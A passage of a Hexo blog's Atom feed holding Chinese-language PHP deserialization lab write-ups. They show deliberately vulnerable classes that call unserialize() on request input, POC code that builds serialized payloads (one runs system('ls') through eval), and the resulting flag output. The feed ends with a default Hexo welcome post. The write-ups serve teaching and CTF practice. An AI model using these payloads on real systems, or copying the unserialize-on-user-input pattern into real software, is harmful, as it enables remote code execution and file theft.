class="line">Tzo2OiJHZW1pbmkiOjI6e3M6MjoiaWQiO3M6NDoiMTMxNyI7czo0OiJ1c2VyIjtzOjg6Imx1dGFsaWNhIjt9</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Gemini=Tzo2OiJHZW1pbmkiOjI6e3M6MjoiaWQiO3M6NDoiMTMxNyI7czo0OiJ1c2VyIjtzOjg6Imx1dGFsaWNhIjt9</span><br></pre></td></tr></table></figure><p>拦截流量，传入<code>payload</code> ，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gemini::__destruct</span><br><span class="line">Gemini::login</span><br><span class="line">Sonder&#123;135d79-ba631f65200a5f-870225232871-7af1e740&#125;</span><br></pre></td></tr></table></figure><p><code>payload</code> 被反序列化，触发<code>Gemini</code> 类的 <code>destruct</code> 方法，进而执行<code>login</code> 方法，最终得以执行<code>file_get_contents(&#39;/flag&#39;)</code> 得到文件<code>/flag</code> 的内容</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>serVuln2 代码审计</title>
    <link href="http://example.com/2023/12/22/serVuln2/"/>
    <id>http://example.com/2023/12/22/serVuln2/</id>
    <published>2023-12-22T13:02:23.000Z</published>
    <updated>2024-02-29T12:14:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taurus</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$email</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span>, <span class="variable">$email</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">register</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;user === <span class="string">&quot;lutalica&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;pass === <span class="string">&quot;P@ssw0rd&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;email === <span class="string">&#x27;231452327@ti.me&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Taurus&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Taurus&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;系统检测发现该处漏洞，进行攻击测试\n&quot;</span>;       </span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taurus</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$email</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span>, <span class="variable">$email</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Taurus</span>(<span class="string">&quot;lutalica&quot;</span>, <span class="string">&quot;P@ssw0rd&quot;</span>, <span class="string">&quot;231452327@ti.me&quot;</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:6:&quot;Taurus&quot;:3:&#123;s:4:&quot;user&quot;;s:8:&quot;lutalica&quot;;s:4:&quot;pass&quot;;s:8:&quot;P@ssw0rd&quot;;s:5:&quot;email&quot;;s:15:&quot;231452327@ti.me&quot;;&#125;</span><br></pre></td></tr></table></figure><p>传入<code>payload</code> ，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Taurus::__destruct</span><br><span class="line">Taurus::register</span><br><span class="line">Sonder&#123;135d79-ba631f65200a5f-870225232871-7af1e740&#125;</span><br></pre></td></tr></table></figure><p><code>payload</code> 被反序列化，触发<code>Taurus</code> 类的 <code>destruct</code> 方法，进而执行<code>register()</code> 方法，最终得以执行<code>file_get_contents(&#39;/flag&#39;)</code> 得到文件<code>/flag</code> 的内容</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>serVuln1 类的实例化</title>
    <link href="http://example.com/2023/12/22/serVuln1/"/>
    <id>http://example.com/2023/12/22/serVuln1/</id>
    <published>2023-12-22T13:01:23.000Z</published>
    <updated>2024-02-29T12:14:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Aries</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$command</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;command);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Aries&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Aries&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;系统检测发现该处漏洞，进行攻击测试\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>                      </span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Aries</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$command</span>=<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Aries</span>());</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Aries&quot;:1:&#123;s:7:&quot;command&quot;;s:13:&quot;system(&#x27;ls&#x27;);&quot;;&#125;</span><br></pre></td></tr></table></figure><p>传入<code>payload</code> ，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Aries::__wakeup</span><br><span class="line">Aries::execute</span><br><span class="line">assert</span><br><span class="line">index.php</span><br><span class="line">module</span><br></pre></td></tr></table></figure><p><code>payload</code> 被反序列化，触发<code>Aries</code> 类的 <code>wakeup</code> 方法，进而执行<code>execute()</code> 方法，最终得以执行危险方法<code>eval()</code> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="类的实例化" scheme="http://example.com/tags/%E7%B1%BB%E7%9A%84%E5%AE%9E%E4%BE%8B%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2023/12/22/hello-world/"/>
    <id>http://example.com/2023/12/22/hello-world/</id>
    <published>2023-12-22T05:13:13.000Z</published>
    <updated>2024-02-29T12:27:42.057Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
